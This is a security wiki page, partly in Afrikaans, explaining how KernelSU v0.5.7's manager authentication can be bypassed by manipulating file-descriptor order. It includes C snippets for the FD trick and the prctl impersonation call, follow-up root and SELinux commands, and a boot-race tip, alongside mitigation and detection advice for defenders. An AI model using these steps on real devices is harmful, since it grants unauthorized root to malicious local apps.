# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting frameworks soos KernelSU, APatch, SKRoot en Magisk pleister dikwels die Linux/Android-kernel en stel bevoorregte funksionaliteit aan ’n onbevoorregte userspace-"manager"-app bloot via ’n hooked syscall. Indien die manager-authentication-stap gebrekkig is, kan enige plaaslike app hierdie kanaal bereik en privileges eskaleer op toestelle wat reeds geroot is.

Hierdie bladsy abstraheer die tegnieke en slaggate wat in openbare navorsing blootgelê is (veral Zimperium se ontleding van KernelSU v0.5.7) om beide red en blue teams te help om attack surfaces, exploitation primitives en robuuste mitigations te verstaan.

---
## Architecture pattern: syscall-hooked manager channel

- Kernel module/patch hook ’n syscall (gewoonlik prctl) om "commands" van userspace te ontvang.
- Protocol is tipies: magic_value, command_id, arg_ptr/len ...
- ’n Userspace manager app authenticateer eers (bv. CMD_BECOME_MANAGER). Sodra die kernel die caller as ’n trusted manager merk, word privileged commands aanvaar:
- Gee root aan caller (bv. CMD_GRANT_ROOT)
- Bestuur allowlists/deny-lists vir su
- Pas SELinux policy aan (bv. CMD_SET_SEPOLICY)
- Vra version/configuration na
- Omdat enige app syscalls kan invoke, is die korrektheid van die manager authentication krities.

Example (KernelSU design):
- Hooked syscall: prctl
- Magic value om na KernelSU-handler te divert: 0xDEADBEEF
- Commands sluit in: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, ens.

---
## KernelSU v0.5.7 authentication flow (as implemented)

Wanneer userspace prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...) call, verifieer KernelSU:

1) Path prefix check
- Die verskafde path moet met ’n verwagte prefix vir die caller UID begin, bv. /data/data/<pkg> of /data/user/<id>/<pkg>.
- Reference: core_hook.c (v0.5.7) path prefix logic.

2) Ownership check
- Die path moet aan die caller UID behoort.
- Reference: core_hook.c (v0.5.7) ownership logic.

3) APK signature check via FD table scan
- Itereer deur die calling process se oop file descriptors (FDs).
- Kies die eerste file waarvan die path met /data/app/*/base.apk ooreenstem.
- Parse APK v2 signature en verifieer dit teen die official manager certificate.
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).

Indien al die checks slaag, cache die kernel die manager se UID tydelik en aanvaar privileged commands vanaf daardie UID totdat dit reset word.

---
## Vulnerability class: trusting “the first matching APK” from FD iteration

Indien die signature check bind aan "the first matching /data/app/*/base.apk" wat in die process se FD table gevind word, verifieer dit nie werklik die caller se eie package nie. ’n Attacker kan ’n legitimately signed APK (die real manager s’n) vooraf positioneer sodat dit vroeër in die FD list voorkom as hul eie base.apk.

Hierdie trust-by-indirection laat ’n onbevoorregte app toe om die manager na te boots sonder om die manager se signing key te besit.

Key properties exploited:
- Die FD scan bind nie aan die caller se package identity nie; dit match slegs path strings volgens ’n pattern.
- open() return die lowest available FD. Deur lower-numbered FDs eers te close, kan ’n attacker die ordering control.
- Die filter check slegs dat die path met /data/app/*/base.apk ooreenstem – nie dat dit met die caller se geïnstalleerde package ooreenstem nie.

---
## Attack preconditions

- Die device is reeds geroot met ’n vulnerable rooting framework (bv. KernelSU v0.5.7).
- Die attacker kan arbitrary unprivileged code locally run (Android app process).
- Die real manager het nog nie ge-authenticateer nie (bv. direk ná ’n reboot). Sommige frameworks cache die manager UID ná sukses; jy moet die race wen.

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps:
1) Bou ’n geldige path na jou eie app data directory om aan die prefix- en ownership-checks te voldoen.
2) Verseker dat ’n genuine KernelSU Manager base.apk op ’n lower-numbered FD as jou eie base.apk geopen word.
3) Invoke prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) om die checks te pass.
4) Issue privileged commands soos CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY om elevation te persist.

Practical notes on step 2 (FD ordering):
- Identifiseer jou process se FD vir jou eie /data/app/*/base.apk deur /proc/self/fd-symlinks te walk.
- Close ’n low FD (bv. stdin, fd 0) en open die legitimate manager APK eerste sodat dit fd 0 (of enige index laer as jou eie base.apk fd) beset.
- Bundle die legitimate manager APK met jou app sodat sy path aan die kernel se naive filter voldoen. Plaas dit byvoorbeeld onder ’n subpath wat met /data/app/*/base.apk match.

Example code snippets (Android/Linux, illustrative only):

Enumerate open FDs to locate base.apk entries:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Dwing ’n FD met ’n laer nommer om na die wettige manager-APK te wys:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Bestuurder-verifikasie via prctl hook:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Na sukses, bevoorregte commands (voorbeelde):
- CMD_GRANT_ROOT: promote current process to root
- CMD_ALLOW_SU: add your package/UID to allowlist for persistent su
- CMD_SET_SEPOLICY: adjust SELinux policy as supported by framework

Race/persistence tip:
- Register a BOOT_COMPLETED receiver in AndroidManifest (RECEIVE_BOOT_COMPLETED) to start early after reboot and attempt authentication before the real manager.

---
## Detection and mitigation guidance

For framework developers:
- Bind authentication to the caller’s package/UID, not to arbitrary FDs:
- Resolve the caller’s package from its UID and verify against the installed package’s signature (via PackageManager) rather than scanning FDs.
- If kernel-only, use stable caller identity (task creds) and validate on a stable source of truth managed by init/userspace helper, not process FDs.
- Avoid path-prefix checks as identity; they are trivially satisfiable by the caller.
- Use nonce-based challenge–response over the channel and clear any cached manager identity at boot or on key events.
- Consider binder-based authenticated IPC instead of overloading generic syscalls when feasible.

For defenders/blue team:
- Detect presence of rooting frameworks and manager processes; monitor for prctl calls with suspicious magic constants (e.g., 0xDEADBEEF) if you have kernel telemetry.
- On managed fleets, block or alert on boot receivers from untrusted packages that rapidly attempt privileged manager commands post-boot.
- Ensure devices are updated to patched framework versions; invalidate cached manager IDs on update.

Limitations of the attack:
- Only affects devices already rooted with a vulnerable framework.
- Typically requires a reboot/race window before the legitimate manager authenticates (some frameworks cache manager UID until reset).

---
## Related notes across frameworks

- Password-based auth (e.g., historical APatch/SKRoot builds) can be weak if passwords are guessable/bruteforceable or validations are buggy.
- Package/signature-based auth (e.g., KernelSU) is stronger in principle but must bind to the actual caller, not indirect artefacts like FD scans.
- Magisk: CVE-2024-48336 (MagiskEoP) showed that even mature ecosystems can be susceptible to identity spoofing leading to code execution with root inside manager context.

---
## References

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
